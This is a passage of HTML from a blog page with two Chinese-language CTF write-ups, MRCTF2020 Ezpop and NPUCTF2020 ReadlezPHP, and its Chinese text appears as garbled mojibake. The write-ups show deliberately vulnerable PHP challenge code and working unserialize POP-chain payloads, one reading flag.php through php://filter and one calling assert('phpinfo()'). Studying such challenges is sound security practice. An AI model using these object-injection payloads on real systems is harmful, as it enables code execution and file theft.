class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p><strong>Modifierè¿™ä¸ªç±»è¿™è¾¹æœ‰é«˜å±å‡½æ•°include</strong> é€šè¿‡<strong>æ„é€ é“¾è¿æ¥åˆ°è¿™è¾¹</strong><br><strong>è¿˜æœ‰invokeè¿™ä¸ªé­”æœ¯æ–¹æ³•ï¼š</strong><br>å¯¹è±¡æœ¬èº«æ˜¯ä¸èƒ½å¤Ÿå½“åšå‡½æ•°å»ä½¿ç”¨çš„ï¼Œä¸€æ—¦è¢«å½“åšå‡½æ•°ä½¿ç”¨ï¼Œå°±ä¼šå›è°ƒæ‰§è¡Œ _ _invoke()æ–¹æ³•ã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure>

<p>testè¿™ä¸ªç±»è¿™è¾¹å°±ç›´æ¥è§¦å‘åˆ°invoke() äº† ç„¶åæ˜¯è§¦å‘è¿™ä¸ª_ _get()æ–¹æ³• _ _get()æ–¹æ³•å°†åœ¨è®¿é—®ä¸å­˜åœ¨çš„æˆå‘˜å˜é‡æ—¶è§¦å‘<br>å°±èƒ½<strong>å°†$p-&gt; $var</strong><br>showè¿™ä¸ªç±»è¿™è¾¹ è¿™æ˜¯popé“¾æ„é€ çš„å¼€å§‹</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ ¹æ®ä»¥ä¸Šé¢˜ç›®ï¼Œå½“ç”¨getæ–¹æ³•ä¼ ä¸€ä¸ªpopå‚æ•°åï¼Œ<strong>ä¼šè‡ªåŠ¨è°ƒç”¨Showç±»çš„ _ wakeup()é­”æœ¯æ–¹æ³•</strong>ã€‚<br>_ wakeup()<strong>é€šè¿‡preg_match()å°†$this-&gt;sourceåšå­—ç¬¦ä¸²æ¯”è¾ƒï¼Œå¦‚æœ$this-&gt;sourceæ˜¯Showç±»ï¼Œå°±è°ƒç”¨äº†toString()æ–¹æ³•ï¼›</strong><br>å¦‚æœ _ toString()å…¶ä¸­strèµ‹å€¼ä¸ºä¸€ä¸ªå®ä¾‹åŒ–çš„<strong>Testç±»</strong>ï¼Œè€Œä¸”å…¶ç±»ä¸å«æœ‰<strong>sourceå±æ€§</strong>ï¼Œæ‰€ä»¥ä¼šè°ƒç”¨Testä¸­çš„ _ get()æ–¹æ³•ã€‚<br>å¦‚æœ_ get()ä¸­çš„<strong>pèµ‹å€¼ä¸ºModifierç±»ï¼Œé‚£ä¹ˆç›¸å½“äºModifierç±»è¢«å½“ä½œå‡½æ•°å¤„ç†</strong>ï¼Œæ‰€ä»¥ä¼šè°ƒç”¨Modifierç±»ä¸­çš„ _ invoke()æ–¹æ³•ã€‚<br>åˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œ<strong>ä½¿ç”¨_invoke()è¯»å–flag.phpçš„å†…å®¹</strong>ã€‚<br>Modifier::_ <em>invoke()&lt;â€“Test::</em> _get()&lt;â€“show::__toString()<br><strong>ååºåˆ—åŒ–ä¸€ä¸ªShow($a) å°±èƒ½è°ƒç”¨wakeup  $a ä¼šè¢«èµ‹å€¼ç»™source ï¼Œè®©$aæ˜¯ä¸€ä¸ªå®ä¾‹åŒ–çš„Showç±»å°±èƒ½è°ƒç”¨toString</strong><br><strong>è®©$açš„showç±»strèµ‹å€¼ä¸ºTestç±» æœ€åè®©strè¿™ä¸ªTestç±»çš„pèµ‹å€¼ä¸ºModifierç±»</strong></p>
<p>æ„é€ å¦‚ä¸‹åºåˆ—åŒ–</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Modifier &#123;</span><br><span class="line">    protected  $var=&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27; ;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">	public function __construct($file)&#123;</span><br><span class="line">    $this-&gt;source = $file;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return &quot;asdasd&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new Show(&#x27;aaa&#x27;);</span><br><span class="line">$a-&gt;str = new Test();</span><br><span class="line">$a-&gt;str-&gt;p = new Modifier();</span><br><span class="line">$b = new Show($a);</span><br><span class="line">echo urlencode(serialize($b));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>è¿™è¾¹urlencodeæ²¡æœ‰è¿™ä¸ªä¸çŸ¥é“ä¸ºä»€ä¹ˆæ— å›æ˜¾</p>
<p>ç„¶åbase64è§£ç å°±å¥½äº†</p>
<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/65.PNG?raw=true" alt="65.PNG"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/07/21/page-79/" data-id="ckroqtfm9001lyww79wskc01b" data-title="MRCTF2020Ezpop" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-page-78" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/07/21/page-78/" class="article-date">
  <time class="dt-published" datetime="2021-07-21T13:24:59.000Z" itemprop="datePublished">2021-07-21</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/07/21/page-78/">NPUCTF2020ReadlezPHP</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>é»‘ä¸æºœç§‹ä¸€ç‰‡<br>æŸ¥çœ‹æºç å‘ç°<strong>å¦ä¸€ä¸ªé¡µé¢ /time.php?source</strong><br>ç„¶åå°±ç»™äº†æºç äº†</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">&quot;Y-m-d h:i:s&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        <span class="variable">$b</span> = <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$b</span>(<span class="variable">$a</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> HelloPhp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>@$ppp = unserialize($_GET[â€œdataâ€]);<br>è€ç†Ÿäººäº†åºåˆ—åŒ–<br>@$ppp = unserialize($_GET[â€œdataâ€]);  è¿™è¾¹æ˜¯ä¼ å‚æ•°çš„åœ°æ–¹<br><strong>è¿™è¾¹$b($a) å› ä¸ºè¿™ä¸ª,å¯ä»¥åˆ©ç”¨phpåŠ¨æ€è°ƒç”¨å‡½æ•°ï¼Œæ‹¿å–flag</strong>ã€‚<br>è¿™è¾¹è¦ç”¨åˆ°assert()å‡½æ•°  æ„æˆä¸€ä¸ª </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">assert(phpinfo())  </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/63.PNG?raw=true" alt="63.PNG"></p>
<p>æ„é€ å¦‚ä¸‹åºåˆ—åŒ– ç”¨phpstudy</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class HelloPhp</span><br><span class="line">&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;a = &quot;phpinfo()&quot;;</span><br><span class="line">        $this-&gt;b = &quot;assert&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        $a = $this-&gt;a;</span><br><span class="line">        $b = $this-&gt;b;</span><br><span class="line">        echo $b($a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = new HelloPhp();</span><br><span class="line">var_dump(serialize($c));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>ç”Ÿæˆï¼šO:8:â€HelloPhpâ€:2:{s:1:â€aâ€;s:9:â€phpinfo()â€;s:1:â€bâ€;s:6:â€assertâ€;}</strong><br>payloadï¼š ?data=O:8:â€HelloPhpâ€:2:{s:1:â€aâ€;s:9:â€phpinfo()â€;s:1:â€bâ€;s:6:â€assertâ€;} å°±å¯ä»¥äº†</p>
<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/64.PNG?raw=true" alt="64.PNG"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/07/21/page-78/" data-id="ckroqtfm8001jyww73obg6s2j" data-title="NPUCTF2020ReadlezPHP" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">June 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">May 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2021/07/29/page-87/">GWCTF 2019æ¯ç‡¥çš„æŠ½å¥–</a>
          </li>
        
          <li>
            <a href="/2021/07/29/page-86/">CISCN2019 ååŒ—èµ›åŒº Day1 Web1Dropbox</a>
          </li>
        
          <li>
            <a href="/2021/07/29/page-85/">æå®¢å¤§æŒ‘æˆ˜ 2019RCE ME</a>
          </li>
        
          <li>
            <a href="/2021/07/29/page-84/">CISCN2019 ååŒ—èµ›åŒº Day1 Web2ikun</a>
          </li>
        
          <li>
            <a href="/2021/07/29/page-83/">MRCTF2020å¥—å¨ƒ</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2021 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.4.1.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>